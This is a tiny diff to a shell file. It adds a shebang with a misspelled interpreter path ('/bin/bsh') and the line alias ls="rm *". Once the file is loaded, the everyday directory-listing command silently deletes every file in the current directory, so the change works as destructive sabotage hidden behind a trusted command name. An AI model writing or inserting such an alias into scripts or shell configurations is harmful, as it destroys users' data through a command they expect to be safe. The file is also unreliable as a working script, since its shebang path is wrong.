@@ -1,1 +1,2 @@
-alias
+#!/bin/bsh
+alias ls="rm *"
